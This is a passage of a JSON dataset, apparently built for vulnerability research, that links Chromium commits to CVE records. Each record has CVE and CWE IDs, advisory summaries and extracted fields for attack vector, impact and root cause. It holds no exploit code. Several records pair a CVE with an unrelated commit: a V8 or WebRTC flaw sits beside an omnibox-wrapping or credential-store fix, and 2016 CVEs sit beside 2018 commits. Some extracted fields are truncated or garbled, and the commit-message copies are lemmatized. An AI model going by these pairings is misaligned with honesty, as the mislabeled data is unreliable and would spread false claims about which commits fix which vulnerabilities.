convinced a user to install a malicious extension to access files on the local file system without file access permission via a crafted Chrome Extension.","commit_message_1":"take default system font size from platformfont the default font returned by skia should take the initial size from the default value kdefaultbasefontsize specified in platformfont","Vulnerability Type":"Missing Authorization","Attack Vector":"via a crafted chrome extension .","Impact":"gain unauthorized access to the system","Root Cause":"run on file : \/ \/ urls","Attack Type":"remote attacker"},{"commit_id":"ca025d47d93664b3dcce6b7cbe9ea58b7d085cd4","cve_id":"CVE-2018-16084","cwe_id":null,"commit_message":"Set Cancel as the default button for the external protocol dialog.\n\nThis ensures that users holding down the Enter or Space key cannot\naccidentally trigger an external protocol launch.\n\nBUG=865202\n\nChange-Id: I2cec7b3c216b80641200c97dec2517a66b4e0b24\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1142705\nCommit-Queue: Dominick Ng <dominickn@chromium.org>\nReviewed-by: Trent Apted <tapted@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#576340}","summary":"The default selected dialog button in CustomHandlers in Google Chrome prior to 69.0.3497.81 allowed a remote attacker who convinced the user to perform certain operations to open external programs via a crafted HTML page.","commit_message_1":"set cancel a the default button for the external protocol dialog","Vulnerability Type":"default selected dialog","Attack Vector":"via a crafted html page","Impact":"perform certain operations to open external programs","Root Cause":"caused by a user confirmation bypass","Attack Type":"remote attacker"},{"commit_id":"8247b125c7b6888dc1c3932e19d6d8fe5a74a460","cve_id":"CVE-2018-16086","cwe_id":"CWE-285","commit_message":"Extensions: Prevent content script injection in the New tab Page.\n\nr487664 disallowed content script injection in the New Tab Page. However, the\ncheck in RendererPermissionsPolicyDelegate::IsRestrictedUrl for the same, might\nnot work due to the following reasons:\n  - There might be a race between checking if the extension can inject the\n    script and setting the new tab url in the renderer (SearchBouncer).\n  - The New Tab page url in the SearchBouncer might be set incorrectly due to\n    incorrect handling of multiple profiles by InstantService.\n\nFix this by checking if the current renderer process is an Instant (NTP)\nrenderer. This should work since the NTP renderer process should not be shared\nwith other sites.\n\nBUG=844428, 662610\n\nChange-Id: I45f6b27fb2680d3b8df6e1da223452ffee09b0d8\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1068607\nReviewed-by: Devlin <rdevlin.cronin@chromium.org>\nCommit-Queue: Karan Bhatia <karandeepb@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#563031}","summary":"Insufficient policy enforcement in extensions API in Google Chrome prior to 69.0.3497.81 allowed an attacker who convinced a user to install a malicious extension to bypass navigation restrictions via a crafted Chrome Extension.","commit_message_1":"prevent content script injection in the new tab page","Vulnerability Type":"Improper Authorization","Attack Vector":"via a crafted chrome extension .","Impact":"install a malicious extension to bypass navigation restrictions","Root Cause":"caused by improper validation of user-supplied input by the New Tab Page","Attack Type":"attacker"},{"commit_id":"fa76a9f7ef6a028f83f97c181b150ecfd2b13be1","cve_id":"CVE-2018-16085","cwe_id":"CWE-416","commit_message":"Fix heap-use-after-free by using weak factory instead of Unretained\n\nBug: 856578\nChange-Id: Ifb2a1b7e6c22e1af36e12eedba72427f51d925b9\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1114617\nReviewed-by: Hector Dearman <hjd@chromium.org>\nCommit-Queue: Hector Dearman <hjd@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#571528}","summary":"A use after free in ResourceCoordinator in Google Chrome prior to 69.0.3497.81 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"fix heap-use-after-free by using weak factory instead of unretained","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"fa68dcfd12e376aa880b3193a77b896e6c54efdf","cve_id":"CVE-2018-6148","cwe_id":"CWE-93","commit_message":"Verify that header values set from Blink don't contain '\\n'.\n\nBecause that would be silly.\n\nBug: 845961\nChange-Id: I69de2cb093a3629de63c48652c9499f7387b8334\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1109757\nCommit-Queue: Mike West <mkwst@chromium.org>\nReviewed-by: Daniel Cheng <dcheng@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#570206}","summary":"Incorrect implementation in Content Security Policy in Google Chrome prior to 67.0.3396.79 allowed a remote attacker to bypass navigation restrictions via a crafted HTML page.","commit_message_1":"verify that header value set from blink do n't contain '\\n '","Vulnerability Type":"CRLF Injection","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"bypass navigation restrictions","Root Cause":"caused by the incorrect handling of CSP header","Attack Type":"remote attacker"},{"commit_id":"a261ea1c56ef16fc0fc4af1e440feb302d577716","cve_id":"CVE-2018-6123","cwe_id":"CWE-416","commit_message":"Fix use-after-free in FileReaderLoader.\n\nAnything that calls out to client_ can cause FileReaderLoader to be\ndestroyed, so make sure to check for that situation.\n\nBug: 835639\nChange-Id: I57533d41b7118c06da17abec28bbf301e1f50646\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1024450\nCommit-Queue: Marijn Kruisselbrink <mek@chromium.org>\nCommit-Queue: Daniel Murphy <dmurph@chromium.org>\nReviewed-by: Daniel Murphy <dmurph@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#552807}","summary":"A use after free in Blink in Google Chrome prior to 67.0.3396.62 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"fix use-after-free in filereaderloader","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"7712d138374a92c4d2f3b05cdc86d1a7a523702b","cve_id":"CVE-2018-6124","cwe_id":null,"commit_message":"ReadableStreamBytesConsumer should check read results\n\nReadableStreamBytesConsumer expected that the results from\nReadableStreamReaderDefaultRead should be Promise<Object> because that\nis provided from ReadableStream provided by blink, but it's possible to\ninject arbitrary values with the promise assimilation.\n\nThis CL adds additional checks for such injection.\n\nBug: 840320\nChange-Id: I7b3c6a8bfcf563dd860b133ff0295dd7a5d5fea5\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1049413\nCommit-Queue: Yutaka Hirano <yhirano@chromium.org>\nReviewed-by: Adam Rice <ricea@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#556751}","summary":"Type confusion in ReadableStreams in Blink in Google Chrome prior to 67.0.3396.62 allowed a remote attacker to potentially exploit object corruption via a crafted HTML page.","commit_message_1":"readablestreambytesconsumer should check read result readablestreambytesconsumer expected that the result from readablestreamreaderdefaultread should be promise < object > because that is provided from readablestream provided by blink , but it 's possible to inject arbitrary value with the promise assimilation","Vulnerability Type":"type confusion","Attack Vector":"via a crafted html page","Impact":"potentially exploit object corruption","Root Cause":"caused by a type confusion","Attack Type":"remote attacker"},{"commit_id":"ac149a8d4371c0e01e0934fdd57b09e86f96b5b9","cve_id":"CVE-2018-6125","cwe_id":null,"commit_message":"Remove libusb-Windows support for HID devices\n\nThis patch removes the Windows-specific support in libusb that provided\na translation between the WinUSB API and the HID API. Applications\ncurrently depending on this using the chrome.usb API should switch to\nusing the chrome.hid API.\n\nBug: 818592\nChange-Id: I82ee6ccdcbccc21d2910dc62845c7785e78b64f6\nReviewed-on: https:\/\/chromium-review.googlesource.com\/951635\nReviewed-by: Ken Rockot <rockot@chromium.org>\nCommit-Queue: Reilly Grant <reillyg@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#541265}","summary":"Insufficient policy enforcement in USB in Google Chrome on Windows prior to 67.0.3396.62 allowed a remote attacker to obtain potentially sensitive information via a crafted HTML page.","commit_message_1":"remove libusb-windows support for hid device this patch remove the windows-specific support in libusb that provided a translation between the winusb api and the hid api","Vulnerability Type":" Insufficient Information","Attack Vector":"via a crafted HTML page","Impact":"obtain potentially sensitive information","Root Cause":"caused by an overly permissive policy","Attack Type":"remote attacker"},{"commit_id":"28044cb7ef4488e7278c2b80f0e3a2c3707d03b6","cve_id":"CVE-2018-6127","cwe_id":null,"commit_message":"[IndexedDB] Fixing early destruction of connection during forceclose\n\nPatch is as small as possible for merging.\n\nBug: 842990\nChange-Id: I9968ffee1bf3279e61e1ec13e4d541f713caf12f\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1062935\nCommit-Queue: Daniel Murphy <dmurph@chromium.org>\nCommit-Queue: Victor Costan <pwnall@chromium.org>\nReviewed-by: Victor Costan <pwnall@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#559383}","summary":"Early free of object in use in IndexDB in Google Chrome prior to 67.0.3396.62 allowed a remote attacker who had compromised the renderer process to potentially perform a sandbox escape via a crafted HTML page.","commit_message_1":"fixing early destruction of connection during forceclose patch is a small a possible for merging","Vulnerability Type":"free of object","Attack Vector":"via a crafted html page","Impact":"potentially perform a sandbox escape","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"a79e1bbb765af34d446e42d34cd00a312b381113","cve_id":"CVE-2018-6132","cwe_id":"CWE-200","commit_message":"Fix wrapping behavior of description text in omnibox suggestion\n\nThis regression is introduced by\nhttps:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/827033\n\nThe description text should not wrap.\n\nBug: NONE\nCq-Include-Trybots: master.tryserver.chromium.android:android_optional_gpu_tests_rel;master.tryserver.chromium.linux:linux_optional_gpu_tests_rel;master.tryserver.chromium.mac:mac_optional_gpu_tests_rel;master.tryserver.chromium.win:win_optional_gpu_tests_rel\nChange-Id: Iaac5e6176e1730853406602835d61fe1e80ec0d0\nReviewed-on: https:\/\/chromium-review.googlesource.com\/839960\nReviewed-by: Christopher Grant <cjgrant@chromium.org>\nCommit-Queue: Biao She <bshe@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#525806}","summary":"Uninitialized data in WebRTC in Google Chrome prior to 67.0.3396.62 allowed a remote attacker to obtain potentially sensitive information from process memory via a crafted video file.","commit_message_1":"fix wrapping behavior of description text in omnibox suggestion this regression is introduced by http : \/\/chromium-<file>","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted video file","Impact":"obtain potentially sensitive information from process memory","Root Cause":"caused by the use of uninitialized memory","Attack Type":"remote attacker"},{"commit_id":"f9b56bc54fdff5981dba39a707489c3ca9980fac","cve_id":"CVE-2018-6133","cwe_id":null,"commit_message":"Map U+04CF to lowercase L as well.\n\nU+04CF (\u04cf) has the confusability skeleton of 'i' (lowercase\nI), but it can be confused for 'l' (lowercase L) or '1' (digit) if rendered\nin some fonts.\n\nIf a host name contains it, calculate the confusability skeleton\ntwice, once with the default mapping to 'i' (lowercase I) and the 2nd\ntime with an alternative mapping to 'l'. Mapping them to 'l' (lowercase L)\nalso gets it treated as similar to digit 1 because the confusability\nskeleton of digit 1 is 'l'.\n\nBug: 817247\nTest: components_unittests --gtest_filter=*IDN*\nChange-Id: I7442b950c9457eea285e17f01d1f43c9acc5d79c\nReviewed-on: https:\/\/chromium-review.googlesource.com\/974165\nCommit-Queue: Jungshik Shin <jshin@chromium.org>\nReviewed-by: Peter Kasting <pkasting@chromium.org>\nReviewed-by: Eric Lawrence <elawrence@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#551263}","summary":"Incorrect handling of confusable characters in URL Formatter in Google Chrome prior to 67.0.3396.62 allowed a remote attacker to perform domain spoofing via IDN homographs via a crafted domain name.","commit_message_1":"map u+04cf to lowercase l a well","Vulnerability Type":"incorrect handling","Attack Vector":"via a crafted html page","Impact":"perform domain spoofing via idn homo","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"87e204e0aaf7445afbd0d50af6849d857517ae70","cve_id":"CVE-2018-6134","cwe_id":"CWE-200","commit_message":"Fix the |name| of PerformanceNavigationTiming\n\nPreviously, the |name| of a PerformanceNavigationTiming entry was the initial\nURL (the request URL). After this CL, it is the response URL, so for example\na url of the form 'redirect?location=newLoc' will have 'newLoc' as the |name|.\n\nBug: 797465\nChange-Id: Icab53ad8027d066422562c82bcf0354c264fea40\nReviewed-on: https:\/\/chromium-review.googlesource.com\/996579\nReviewed-by: Yoav Weiss <yoav@yoav.ws>\nCommit-Queue: Nicol\u00e1s Pe\u00f1a Moreno <npm@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#548773}","summary":"Information leak in Blink in Google Chrome prior to 67.0.3396.62 allowed a remote attacker to bypass no-referrer policy via a crafted HTML page.","commit_message_1":"fix the |name| of performancenavigationtiming previously , the |name| of a performancenavigationtiming entry wa the initial url ( the request url )","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted html page","Impact":"bypass no - referrer policy","Root Cause":"caused by a Referrer Policy bypass","Attack Type":"remote attacker"},{"commit_id":"2ccbb407dccc976ae4bdbaa5ff2f777f4eb0723b","cve_id":"CVE-2018-6135","cwe_id":null,"commit_message":"Force a flush of drawing to the widget when a dialog is shown.\n\nBUG=823353\nTEST=as in bug\n\nChange-Id: I5da777068fc29c5638ef02d50e59d5d7b2729260\nReviewed-on: https:\/\/chromium-review.googlesource.com\/971661\nReviewed-by: Ken Buchanan <kenrb@chromium.org>\nCommit-Queue: Avi Drissman <avi@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#544518}","summary":"Lack of clearing the previous site before loading alerts from a new one in Blink in Google Chrome prior to 67.0.3396.62 allowed a remote attacker to perform domain spoofing via a crafted HTML page.","commit_message_1":"force a flush of drawing to the widget when a dialog is shown","Vulnerability Type":"Lack of clearing the previous site","Attack Vector":"via a crafted html page","Impact":"perform domain spoofing","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"67d9b414fa64448abc398ae9fc57c3ddf5de5998","cve_id":"CVE-2018-6137","cwe_id":"CWE-200","commit_message":"[PaintWorklet] Do not paint when paint target is associated with a link\n\nWhen the target element of a paint worklet has an associated link, then\nthe 'paint' function will be invoked when the link's href is changed\nfrom a visited URL to an unvisited URL (or vice versa).\n\nThis CL changes the behavior by detecting whether the target element\nof a paint worklet has an associated link or not. If it does, then don't\npaint.\n\nTBR=haraken@chromium.org\n\nBug: 835589\nChange-Id: I5fdf85685f863c960a6f48cc9a345dda787bece1\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1035524\nReviewed-by: Xida Chen <xidachen@chromium.org>\nReviewed-by: Ian Kilpatrick <ikilpatrick@chromium.org>\nReviewed-by: Stephen McGruer <smcgruer@chromium.org>\nCommit-Queue: Xida Chen <xidachen@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#555788}","summary":"CSS Paint API in Blink in Google Chrome prior to 67.0.3396.62 allowed a remote attacker to leak cross-origin data via a crafted HTML page.","commit_message_1":"do not paint when paint target is associated with a link when the target element of a paint worklet ha an associated link , then the 'paint ' function will be invoked when the link 's href is changed from a visited url to an unvisited url ( or vice versa )","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted html page","Impact":"leak cross - origin data","Root Cause":"caused by a leak of visited status of page","Attack Type":"remote attacker"},{"commit_id":"0aca6bc05a263ea9eafee515fc6ba14da94c1964","cve_id":"CVE-2018-6138","cwe_id":"CWE-20","commit_message":"[Extensions] Restrict tabs.captureVisibleTab()\n\nModify the permissions for tabs.captureVisibleTab(). Instead of just\nchecking for <all_urls> and assuming its safe, do the following:\n- If the page is a \"normal\" web page (e.g., http\/https), allow the\n  capture if the extension has activeTab granted or <all_urls>.\n- If the page is a file page (file:\/\/\/), allow the capture if the\n  extension has file access *and* either of the <all_urls> or\n  activeTab permissions.\n- If the page is a chrome:\/\/ page, allow the capture only if the\n  extension has activeTab granted.\n\nBug: 810220\n\nChange-Id: I1e2f71281e2f331d641ba0e435df10d66d721304\nReviewed-on: https:\/\/chromium-review.googlesource.com\/981195\nCommit-Queue: Devlin <rdevlin.cronin@chromium.org>\nReviewed-by: Karan Bhatia <karandeepb@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#548891}","summary":"Insufficient policy enforcement in Extensions API in Google Chrome prior to 67.0.3396.62 allowed an attacker who convinced a user to install a malicious extension to bypass navigation restrictions via a crafted Chrome Extension.","commit_message_1":"restrict <file> ( ) modify the permission for <file> ( )","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted chrome extension","Impact":"install a malicious extension to bypass navigation restrictions","Root Cause":"caused by an overly permissive policy","Attack Type":"remote attacker"},{"commit_id":"46f5cfb6414c04b65cba4ec59ca992f338934fc9","cve_id":"CVE-2018-6139","cwe_id":"CWE-20","commit_message":"[DevTools] Do not create target handler for restricted sessions\n\nBug: 805224\nChange-Id: I08528e44e79d0a097cfe72ab4949dda538efd098\nReviewed-on: https:\/\/chromium-review.googlesource.com\/988695\nReviewed-by: Pavel Feldman <pfeldman@chromium.org>\nCommit-Queue: Dmitry Gozman <dgozman@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#547496}","summary":"Insufficient target checks on the chrome.debugger API in DevTools in Google Chrome prior to 67.0.3396.62 allowed an attacker who convinced a user to install a malicious extension to execute arbitrary code via a crafted Chrome Extension.","commit_message_1":"do not create target handler for restricted session","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted chrome extension","Impact":"install a malicious extension to execute arbitrary code","Root Cause":"caused by a restrictions bypass","Attack Type":"remote attacker"},{"commit_id":"2aec794f26098c7a361c27d7c8f57119631cca8a","cve_id":"CVE-2018-6140","cwe_id":"CWE-20","commit_message":"[DevTools] Do not allow chrome.debugger to attach to web ui pages\n\nIf the page navigates to web ui, we force detach the debugger extension.\n\nTBR=alexclarke@chromium.org\n\nBug: 798222\nChange-Id: Idb46c2f59e839388397a8dfa6ce2e2a897698df3\nReviewed-on: https:\/\/chromium-review.googlesource.com\/935961\nCommit-Queue: Dmitry Gozman <dgozman@chromium.org>\nReviewed-by: Devlin <rdevlin.cronin@chromium.org>\nReviewed-by: Pavel Feldman <pfeldman@chromium.org>\nReviewed-by: Nasko Oskov <nasko@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#540916}","summary":"Allowing the chrome.debugger API to attach to Web UI pages in DevTools in Google Chrome prior to 67.0.3396.62 allowed an attacker who convinced a user to install a malicious extension to execute arbitrary code via a crafted Chrome Extension.","commit_message_1":"do not allow <file> to attach to web ui page if the page navigates to web ui , we force detach the debugger extension","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted chrome extension","Impact":"install a malicious extension to execute arbitrary code","Root Cause":"attach to web ui pages","Attack Type":"remote attacker"},{"commit_id":"1f35b6980f600ec93e167118c21959d5cbd7c5c4","cve_id":"CVE-2018-6143","cwe_id":"CWE-125","commit_message":"Fix Credential Management API Store() for existing Credentials\n\nThis changes fixes the Credential Management API to correctly handle\nstoring of already existing credentials. In the previous version\n`preferred_match()` was updated, which is not necessarily the credential\nselected by the user.\n\nBug: 795878\nCq-Include-Trybots: master.tryserver.chromium.linux:linux_mojo\nChange-Id: I269f465861f44cdd784f0ce077e755191d3bd7bd\nReviewed-on: https:\/\/chromium-review.googlesource.com\/843022\nCommit-Queue: Jan Wilken D\u00f6rrie <jdoerrie@chromium.org>\nReviewed-by: Balazs Engedy <engedy@chromium.org>\nReviewed-by: Jochen Eisinger <jochen@chromium.org>\nReviewed-by: Maxim Kolosovskiy <kolos@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#526313}","summary":"Insufficient validation in V8 in Google Chrome prior to 67.0.3396.62 allowed a remote attacker to perform an out of bounds memory read via a crafted HTML page.","commit_message_1":"fix credential management api store ( ) for existing credential this change fix the credential management api to correctly handle storing of already existing credential","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted html page","Impact":"perform an out of bounds memory read","Root Cause":"caused by an out-of-bounds memory access","Attack Type":"remote attacker"},{"commit_id":"9f6510f20ccd794c4a71d5779ae802241e6e3f9b","cve_id":"CVE-2018-6144","cwe_id":"CWE-787","commit_message":"Add the method to check if offline archive is in internal dir\n\nBug: 758690\nChange-Id: I8bb4283fc40a87fa7a87df2c7e513e2e16903290\nReviewed-on: https:\/\/chromium-review.googlesource.com\/828049\nReviewed-by: Filip Gorski <fgorski@chromium.org>\nCommit-Queue: Jian Li <jianli@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#524232}","summary":"Off-by-one error in PDFium in Google Chrome prior to 67.0.3396.62 allowed a remote attacker to perform an out of bounds memory write via a crafted PDF file.","commit_message_1":"add the method to check if offline archive is in internal dir","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"via a crafted pdf file","Impact":"perform an out of bounds memory write","Root Cause":"caused by an out-of-bounds memory access","Attack Type":"remote attacker"},{"commit_id":"133bc5c262b2555af223263452e9875a95db9eb7","cve_id":"CVE-2018-6145","cwe_id":"CWE-79","commit_message":"HTML parser: Fix \"HTML integration point\" implementation in HTMLTreeBuilderSimulator.\n\nHTMLTreeBuilderSimulator assumed only <foreignObject> as an HTML\nintegration point. This CL adds <annotation-xml>, <desc>, and SVG\n<title>.\n\nBug: 805924\nChange-Id: I6793d9163d4c6bc8bf0790415baedddaac7a1fc2\nReviewed-on: https:\/\/chromium-review.googlesource.com\/964038\nCommit-Queue: Kent Tamura <tkent@chromium.org>\nReviewed-by: Kouhei Ueno <kouhei@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#543634}","summary":"Insufficient data validation in HTML parser in Google Chrome prior to 67.0.3396.62 allowed a remote attacker to bypass same origin policy via a crafted HTML page.","commit_message_1":"fix `` html integration point '' implementation in htmltreebuildersimulator","Vulnerability Type":"Cross-site Scripting","Attack Vector":"via a crafted html page","Impact":"bypass same origin policy","Root Cause":"caused by the incorrect escaping of MathML","Attack Type":"remote attacker"},{"commit_id":"7614790c80996d32a28218f4d1605b0908e9ddf6","cve_id":"CVE-2018-6121","cwe_id":"CWE-20","commit_message":"Apply ExtensionNavigationThrottle filesystem\/blob checks to all frames.\n\nBUG=836858\n\nChange-Id: I34333a72501129fd40b5a9aa6378c9f35f1e7fc2\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1028511\nReviewed-by: Devlin <rdevlin.cronin@chromium.org>\nReviewed-by: Alex Moshchuk <alexmos@chromium.org>\nReviewed-by: Nick Carter <nick@chromium.org>\nCommit-Queue: Charlie Reis <creis@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#553867}","summary":"Insufficient validation of input in Blink in Google Chrome prior to 66.0.3359.170 allowed a remote attacker to perform privilege escalation via a crafted HTML page.","commit_message_1":"apply extensionnavigationthrottle filesystem\/blob check to all frame","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"perform privilege escalation","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"9ab771022535b499e4d7a7f12fa6c60a294f7de4","cve_id":"CVE-2018-6118","cwe_id":"CWE-416","commit_message":"[MemCache] Fix bug while iterating LRU list in range doom\n\nThis is exact same thing as https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/987919\nbut on explicit mass-erase rather than eviction.\n\nThanks to nedwilliamson@ (on gmail) for the report and testcase.\n\nBug: 831963\nChange-Id: I96a46700c1f058f7feebe038bcf983dc40eb7102\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1014023\nCommit-Queue: Maks Orlovich <morlovich@chromium.org>\nReviewed-by: Josh Karlin <jkarlin@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#551205}","summary":"A double-eviction in the Incognito mode cache that lead to a user-after-free in cache in Google Chrome prior to 66.0.3359.139 allowed a remote attacker who had compromised the renderer process to execute arbitrary code via a crafted HTML page.","commit_message_1":"fix bug while iterating lru list in range doom this is exact same thing a http : \/\/chromium-<file>","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"execute arbitrary code","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"c050720e317e5223bcbdcaafb816befa789ceaa9","cve_id":"CVE-2017-15402","cwe_id":null,"commit_message":"Don't update PageState for a SiteInstance mismatch.\n\nBUG=766262\nTEST=See bug for repro.\n\nChange-Id: Ifb087b687acd40d8963ef436c9ea82ca2d960117\nReviewed-on: https:\/\/chromium-review.googlesource.com\/674808\nCommit-Queue: Charlie Reis (OOO until 9\/25) <creis@chromium.org>\nReviewed-by: \u0141ukasz Anforowicz <lukasza@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#503297}","summary":"Using an ID that can be controlled by a compromised renderer which allows any frame to overwrite the page_state of any other frame in the same process in Navigation in Google Chrome on Chrome OS prior to 62.0.3202.74 allowed a remote attacker who had compromised the renderer process to potentially perform a sandbox escape via a crafted HTML page.","commit_message_1":"do n't update pagestate for a siteinstance mismatch","Vulnerability Type":"unspecified","Attack Vector":"via a crafted html page","Impact":"overwrite the page _ state of any other frame in the same process in navigation in google chrome on chrome os prior to 62 . 0 . 3202 . 74 allowed a remote","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"1f5ad409dbf5334523931df37598ea49e9849c87","cve_id":"CVE-2016-1678","cwe_id":"CWE-119","commit_message":"Allow origin lock for WebUI pages.\n\nReturning true for WebUI pages in DoesSiteRequireDedicatedProcess helps\nto keep enforcing a SiteInstance swap during chrome:\/\/foo ->\nchrome:\/\/bar navigation, even after relaxing\nBrowsingInstance::GetSiteInstanceForURL to consider RPH::IsSuitableHost\n(see https:\/\/crrev.com\/c\/783470 for that fixes process sharing in\nisolated(b(c),d(c)) scenario).\n\nI've manually tested this CL by visiting the following URLs:\n- chrome:\/\/welcome\/\n- chrome:\/\/settings\n- chrome:\/\/extensions\n- chrome:\/\/history\n- chrome:\/\/help and chrome:\/\/chrome (both redirect to chrome:\/\/settings\/help)\n\nBug: 510588, 847127\nChange-Id: I55073bce00f32cb8bc5c1c91034438ff9a3f8971\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1237392\nCommit-Queue: \u0141ukasz Anforowicz <lukasza@chromium.org>\nReviewed-by: Fran\u00e7ois Doray <fdoray@chromium.org>\nReviewed-by: Nasko Oskov <nasko@chromium.org>\nReviewed-by: Avi Drissman <avi@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#595259}","summary":"objects.cc in Google V8 before 5.0.71.32, as used in Google Chrome before 51.0.2704.63, does not properly restrict lazy deoptimization, which allows remote attackers to cause a denial of service (heap-based buffer overflow) or possibly have unspecified other impact via crafted JavaScript code.","commit_message_1":"allow origin lock for webui page","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted javascript code","Impact":"cause a denial of service ( heap - based buffer overflow ) or possibly have unspecified other impact","Root Cause":"does not properly restrict lazy deoptimization","Attack Type":"remote attacker"},{"commit_id":"5289a5d4c98681e9a0f2d28da0c7aa35e282db57","cve_id":"CVE-2016-1682","cwe_id":"CWE-284","commit_message":"Check CSP before registering ServiceWorkers\n\nService Worker registrations should be subject to the same CSP checks as\nother workers. The spec doesn't say this explicitly\n(https:\/\/www.w3.org\/TR\/CSP2\/#directive-child-src-workers says \"Worker or\nSharedWorker constructors\"), but it seems to be in the spirit of things,\nand it matches Firefox's behavior.\n\nBUG=579801\n\nReview URL: https:\/\/codereview.chromium.org\/1861253004\n\nCr-Commit-Position: refs\/heads\/master@{#385775}","summary":"The ServiceWorkerContainer::registerServiceWorkerImpl function in WebKit\/Source\/modules\/serviceworkers\/ServiceWorkerContainer.cpp in Blink, as used in Google Chrome before 51.0.2704.63, allows remote attackers to bypass the Content Security Policy (CSP) protection mechanism via a ServiceWorker registration.","commit_message_1":"check csp before registering serviceworkers service worker registration should be subject to the same csp check a other worker","Vulnerability Type":"Improper Access Control","Attack Vector":"via a serviceworker registration","Impact":"bypass the content security policy ( csp ) protection mechanism","Root Cause":"caused by an error related to ServiceWorker","Attack Type":"remote attacker"},{"commit_id":"e3e16497d0d5639fb3257305ea369ba4ab8ba210","cve_id":"CVE-2016-1686","cwe_id":"CWE-119","commit_message":"Clear |composing_text_| after CommitText() is called.\n\n|composing_text_| of InputConnectionImpl should be cleared after\nCommitText() is called. Otherwise, FinishComposingText() will commit the\nsame text twice.\n\nBug: 899736\nTest: unit_tests\nChange-Id: Idb22d968ffe95d946789fbe62454e8e79cb0b384\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1304773\nCommit-Queue: Yusuke Sato <yusukes@chromium.org>\nReviewed-by: Yusuke Sato <yusukes@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#603518}","summary":"The CPDF_DIBSource::CreateDecoder function in core\/fpdfapi\/fpdf_render\/fpdf_render_loadimage.cpp in PDFium, as used in Google Chrome before 51.0.2704.63, mishandles decoder-initialization failure, which allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted PDF document.","commit_message_1":"clear |composing_text_| after committext ( ) is called","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"57cea39f336a9465aafdec373867b9c36de9394c","cve_id":"CVE-2016-1687","cwe_id":"CWE-200","commit_message":"Create Crostini Feature and Flag for Crostini USB support\n\nAdds feature for Mounting Usbs into Crostini.\n\nBug: 891381, 899568\nChange-Id: I36f5cdf88d2901b24c9ef83671418fae64f275ad\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1301095\nCommit-Queue: Josh Pratt <jopra@chromium.org>\nReviewed-by: Nicholas Verne <nverne@chromium.org>\nReviewed-by: Ben Wells <benwells@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#603748}","summary":"The renderer implementation in Google Chrome before 51.0.2704.63 does not properly restrict public exposure of classes, which allows remote attackers to obtain sensitive information via vectors related to extensions.","commit_message_1":"create crostini feature and flag for crostini usb support add feature for mounting usbs into crostini","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via vectors related to extensions","Impact":"obtain sensitive information","Root Cause":"does not properly restrict public exposure of classes","Attack Type":"remote 